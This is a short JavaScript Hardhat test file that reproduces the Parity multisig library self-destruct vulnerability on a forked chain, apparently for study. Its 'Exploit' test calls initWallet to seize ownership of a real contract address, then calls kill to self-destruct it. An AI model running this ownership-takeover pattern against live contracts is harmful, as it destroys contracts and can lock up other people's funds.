const { expect } = require("chai");
const {expectRevert} = require("@openzeppelin/test-helpers");
const { ethers, waffle} = require("hardhat");

const provider = waffle.provider;


describe("Parity Library Contract Self Destruct vulnerability", function() {
    this.timeout("250000");
    let target;
    let accounts;

    // it("Check", async function () {
    //     console.log(hardhat)
    //     // console.log(hre.ether)
    // })


    before(async () => {
        target = await hre.ethers.getVerifiedContractAt("0x863df6bfa4469f3ead0be8f9f2aae51c91a907b4");
        accounts = await ethers.getSigners();
    })

    it("Read the correct address", async function () {   
        console.log("the contract address at block 4500000 is: " + await target.address);
    });    

    it("Verify Ownership", async function () {
        console.log("My Address: " + accounts[0].address);
        console.log("How many owners Contract has ?" + " " + await target.m_numOwners());
        console.log("Who's the owner" + " " + await target.getOwner(0));
    })

    it("Exploit", async function () {
        await target.initWallet([accounts[0].address], 0, 8218900000);
        // console.log("Who's the Owner now?" + target.owner);
        console.log("Who's the owner" + " " + await target.getOwner(0));
        console.log("My Address: " + accounts[0].address);
        console.log("I am the Owner now");

        await target.kill(accounts[0].address);
    })
})
